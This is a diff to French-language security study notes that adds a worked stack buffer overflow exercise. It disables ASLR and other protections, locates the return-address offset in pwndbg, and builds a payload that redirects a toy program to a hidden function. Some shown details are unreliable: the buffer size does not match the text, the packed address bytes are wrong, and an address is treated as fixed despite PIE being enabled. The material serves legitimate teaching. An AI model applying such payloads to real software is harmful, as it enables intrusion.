@@ -8,7 +8,158 @@ En effet, le buffer peut potentiellement réécrire le contenu des registres qui
 
 > **Objectif:** comprendre les failles de type buffer overflow, étudier les protections mises en place au cours des dernières années ainsi que leurs contournements.
 
+## Avant-propos
+
+Lire et comprendre [Reverse](https://github.com/amir0r/notes/tree/master/Infosec/Reverse#reverse) avant.
+
 ## Buffer overflow
+
+### Exemple pratique
+
+On considère le programme suivant:
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+void  ret2flag()
+{
+  printf("Well done! You exploited a buffer overflow ;)\n");
+}
+
+void func(char *arg)
+{
+    char buffer[18];
+    strcpy(buffer,arg);
+    printf("%s\n", buffer);
+}
+
+int main(int argc, char *argv[])
+{
+    if(argc != 2) printf("Usage: ./bof <string> \n");
+    else func(argv[1]);
+    return 0;
+}
+```
+
+Ce programme affiche simplement la chaîne de caractères qui lui est donnée en paramètre.
+
+Le problème de ce programme c'est le `strcpy` qui <u>copie dans le **buffer** de taille 32 un chaîne de caractères de taille variable _(inconnu)_</u>. 
+
+**Objectif nº1:** appeler la fonction `ret2flag` en écrasant la sauvegarde d'**`EIP`** _(stockée sur la pile lors de l'appel à la fonction)_ via un débordement de tampon _(buffer overflow)_.
+
+```bash
+$ # on désactive l'ASLR (décrit un peu plus bas)
+$ echo 0 > /proc/sys/kernel/randomize_va_space
+$ # compile bof.c pour archi 32 bits en désactivant le Canari ainsi que le NX-Bit (décrit également plus bas)
+$ gcc -m32 -fno-stack-protector -z execstack bof.c -o bof
+$ # on peut vérifier les sécurités activées sur un programme via la commande `checksec` dans gdb
+$ gdb -q bof
+Reading symbols from bof...(no debugging symbols found)...done.
+pwndbg$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : ENABLED
+RELRO     : Partial
+pwndbg$ # on calcule le padding nécessaire pour faire crasher le programme
+pwndbg$ pattern create 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+pwndbg$ # on lance le programme avec le pattern généré
+Program received signal SIGSEGV, Segmentation fault.
+
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────
+ EAX  0x65
+ EBX  0x41284141 ('AA(A')
+ ECX  0xb7fb4890 (_IO_stdfile_1_lock) ◂— 0
+ EDX  0x65
+ EDI  0xb7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1d9d6c */
+ ESI  0xb7fb3000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1d9d6c */
+ EBP  0x41414441 ('ADAA')
+ ESP  0xbffff320 ◂— 'AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+ EIP  0x2941413b (';AA)')
+────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────
+Invalid address 0x2941413b
+────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────
+00:0000│ esp  0xbffff320 ◂— 'AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+01:0004│      0xbffff324 ◂— 'AaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+02:0008│      0xbffff328 ◂— '0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+03:000c│      0xbffff32c ◂— 'AAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+04:0010│      0xbffff330 ◂— 'A1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+05:0014│      0xbffff334 ◂— 'GAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+06:0018│      0xbffff338 ◂— 'AA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+07:001c│      0xbffff33c ◂— 'AHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────
+ ► f 0 2941413b
+   f 1 41454141
+   f 2 41416141
+   f 3 46414130
+   f 4 41624141
+   f 5 41413141
+   f 6 63414147
+   f 7 41324141
+   f 8 41414841
+   f 9 33414164
+   f 10 41494141
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg$ # on calcul l'offset (d'autres méthodes existent comme ave pattern offset)
+pwndbg$ pattern search
+Registers contain pattern buffer:
+EBX+0 found at offset: 22
+EBP+0 found at offset: 26
+EIP+0 found at offset: 30
+Registers point to pattern buffer:
+[ESP] --> offset 34 - size ~66
+Pattern buffer found at:
+0x00405160 : offset    0 - size  100 ([heap])
+0xbffff2fe : offset    0 - size  100 ($sp + -0x22 [-9 dwords])
+0xbffff57f : offset    0 - size  100 ($sp + 0x25f [151 dwords])
+References to pattern buffer found at:
+0xb7fb3d84 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
+0xb7fb3d88 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
+0xb7fb3d8c : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
+0xb7fb3d90 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
+0xb7fb3d94 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
+0xb7fb3d98 : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
+0xb7fb3d9c : 0x00405160 (/usr/lib/i386-linux-gnu/libc-2.28.so)
+0xbffff164 : 0x00405160 ($sp + -0x1bc [-111 dwords])
+0xbffff1c8 : 0x00405160 ($sp + -0x158 [-86 dwords])
+0xbffff1e8 : 0x00405160 ($sp + -0x138 [-78 dwords])
+0xbffff1f4 : 0x00405160 ($sp + -0x12c [-75 dwords])
+0xbffff214 : 0x00405160 ($sp + -0x10c [-67 dwords])
+0xbffff224 : 0x00405160 ($sp + -0xfc [-63 dwords])
+0xbffff274 : 0x00405160 ($sp + -0xac [-43 dwords])
+0xbffff264 : 0xbffff2fe ($sp + -0xbc [-47 dwords])
+0xbffff2e0 : 0xbffff2fe ($sp + -0x40 [-16 dwords])
+0xbffff2e4 : 0xbffff57f ($sp + -0x3c [-15 dwords])
+0xbffff3e8 : 0xbffff57f ($sp + 0xc8 [50 dwords])
+gdb-peda$ # l'offset qui nous intéresse est donc 30
+```
+
+Maintenant, il faut récupérer l'adresse de la fonction `ret2flag` que l'on souhaite appeler. Pour ce faire, on peut utiliser `nm` qui permet de lister le noms des **symboles** présents dans notre fichier binaire:
+
+```bash
+$ nm bof | grep ret2flag
+000011a9 T ret2flag
+$ # on doit donc envoyer au programme l'adresse 0x000011a9 en 'little endian' et pwntools permet de le faire
+$ python
+Python 2.7.18rc1 (default, Apr  7 2020, 12:05:55) 
+[GCC 9.3.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> import pwn
+>>> 
+>>> pwn.p32(0x000011a9)
+'\xa9\x11\x40\x00'
+>>> quit
+$ ./bof $(python -c "print 'A' * 30 + '\xa9\x11\x40\x00'")
+bash: warning: command substitution: ignored null byte in input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
+Well done! You exploited a buffer overflow ;)
+Segmentation faul 
+```
+
+Et voilà le travail !
 
 > Heap overflow
 
@@ -16,7 +167,7 @@ En effet, le buffer peut potentiellement réécrire le contenu des registres qui
 
 ### Shellcode
 
-### Stack Canary? Bypass!
+### Stack Canari? Bypass!
 
 > Technique du Canary est une placée après les fonctions/buffers à risque (que l'on souhaite protéger). Si le canary à été altéré, le programme s'arrête.
 
@@ -97,6 +248,7 @@ pwndbg> find AAAA
 
 ## Tools
 
+- [python pwntools](https://docs.pwntools.com/en/stable/)
 - [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget)
 - [**Ropper**](https://github.com/sashs/Ropper)
 - [xrop](https://github.com/acama/xrop)
